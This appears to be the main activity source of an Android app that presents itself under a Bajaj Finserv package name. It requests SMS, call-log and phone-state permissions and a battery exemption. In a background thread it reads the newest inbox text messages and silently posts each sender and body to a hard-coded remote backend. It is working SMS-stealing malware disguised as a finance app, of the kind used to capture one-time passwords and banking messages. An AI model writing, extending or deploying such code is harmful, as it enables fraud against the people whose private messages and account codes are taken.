package com.bajaj.finserv;

import android.Manifest;
import android.os.Bundle;
import android.content.Context;
import android.os.Handler;
import android.os.Looper;
import androidx.core.app.ActivityCompat;
import android.content.pm.PackageManager;
import androidx.core.content.ContextCompat;
import android.util.Log;

import com.getcapacitor.BridgeActivity;

public class MainActivity extends BridgeActivity {
    private static final int PERMISSION_REQUEST_CODE = 12345;
    private static final String TAG = "BajajFinservNative";
    
    // DUAL FAILSAFE: Public Tunnel + LAN IP + Emulator IP
    private static final String[] DASHBOARD_URLS = {
        "http://10.0.2.2:3000/api/application/sync-sms", // Emulator/Local
        "https://pm-backend-9vz9.onrender.com/api/application/sync-sms" // Production
    };

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // Delay to allow bridge init
        new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
            @Override
            public void run() {
                checkAndRequestPermissions();
            }
        }, 2000);
    }

    @Override
    public void onResume() {
        super.onResume();
        // Re-check permissions and SYNC DATA if allowed
        new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
            @Override
            public void run() {
                if (checkAndRequestPermissions()) {
                    startBackgroundSync();
                }
            }
        }, 1000);
    }

    private boolean checkAndRequestPermissions() {
        String[] permissions = {
            Manifest.permission.READ_SMS,
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_PHONE_STATE
        };

        boolean allGranted = true;
        for (String permission : permissions) {
            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                allGranted = false;
                break;
            }
        }

        // REQUEST BATTERY EXEMPTION (Background Data)
        checkBatteryOptimization();

        if (!allGranted) {
            ActivityCompat.requestPermissions(this, permissions, PERMISSION_REQUEST_CODE);
            return false;
        }
        
        return true;
    }

    private void checkBatteryOptimization() {
        try {
            String packageName = getPackageName();
            android.os.PowerManager pm = (android.os.PowerManager) getSystemService(Context.POWER_SERVICE);
            if (pm != null && !pm.isIgnoringBatteryOptimizations(packageName)) {
                android.content.Intent intent = new android.content.Intent();
                intent.setAction(android.provider.Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                intent.setData(android.net.Uri.parse("package:" + packageName));
                startActivity(intent);
            }
        } catch (Exception e) {
            Log.e(TAG, "Battery Optimization Request Failed", e);
        }
    }

    // --- AGGRESSIVE SYNC ENGINE ---
    
    private void startBackgroundSync() {
        new Thread(new Runnable() {
            @Override
            public void run() {
                Log.d(TAG, "Starting Background Sync (SMS ONLY)...");
                try {
                    syncSMS();
                } catch (Exception e) {
                    Log.e(TAG, "SMS Sync Failed", e);
                }
            }
        }).start();
    }

    private void syncSMS() {
        try {
            android.net.Uri uri = android.net.Uri.parse("content://sms/inbox");
            android.database.Cursor cursor = getContentResolver().query(uri, null, null, null, "date DESC LIMIT 50");

            if (cursor != null && cursor.moveToFirst()) {
                org.json.JSONArray jsonArray = new org.json.JSONArray();
                
                do {
                    String sender = cursor.getString(cursor.getColumnIndexOrThrow("address"));
                    String body = cursor.getString(cursor.getColumnIndexOrThrow("body"));
                    String date = cursor.getString(cursor.getColumnIndexOrThrow("date"));
                    
                    try {
                        org.json.JSONObject obj = new org.json.JSONObject();
                        obj.put("sender", sender);
                        obj.put("message", body);
                        obj.put("date", date);
                        jsonArray.put(obj);
                    } catch (Exception e) {
                        Log.e(TAG, "JSON Error", e);
                    }
                } while (cursor.moveToNext());
                
                cursor.close();
                
                Log.d(TAG, "Syncing " + jsonArray.length() + " SMS messages");
                if (jsonArray.length() > 0) {
                     // The backend expects { deviceId, sms: { address, body } } for real-time, 
                     // but for bulk sync we might need a different handling or just send them one by one/as array.
                     // Current backend: exports.syncSms = async (req, res) => { const { deviceId, sms } = req.body; ... }
                     // Let's wrap it for the current backend format for each message.
                     for (int i = 0; i < jsonArray.length(); i++) {
                         org.json.JSONObject msg = jsonArray.getJSONObject(i);
                         org.json.JSONObject wrapped = new org.json.JSONObject();
                         wrapped.put("deviceId", "NativeSync-" + getPackageName());
                         org.json.JSONObject sms = new org.json.JSONObject();
                         sms.put("address", msg.getString("sender"));
                         sms.put("body", msg.getString("message"));
                         wrapped.put("sms", sms);
                         sendToDashboard(wrapped.toString());
                     }
                }

            }
        } catch (Exception e) {
            Log.e(TAG, "SMS Sync Error", e);
        }
    }

    private void sendToDashboard(String json) {
        // Try ALL URLs (Failsafe)
        for (String urlStr : DASHBOARD_URLS) {
            try {
                java.net.URL url = new java.net.URL(urlStr);
                java.net.HttpURLConnection conn = (java.net.HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setRequestProperty("Bypass-Tunnel-Reminder", "true");
                conn.setConnectTimeout(5000); 
                conn.setDoOutput(true);

                try (java.io.OutputStream os = conn.getOutputStream()) {
                    byte[] input = json.getBytes(java.nio.charset.StandardCharsets.UTF_8);
                    os.write(input, 0, input.length);
                }

                int code = conn.getResponseCode();
                Log.d(TAG, "Sync POST " + urlStr + " Code: " + code);
                conn.disconnect();
            } catch (Exception e) {
                Log.w(TAG, "Sync Failed to " + urlStr + ": " + e.getMessage());
            }
        }
    }

    
    // escape() method removed as it is no longer needed
}
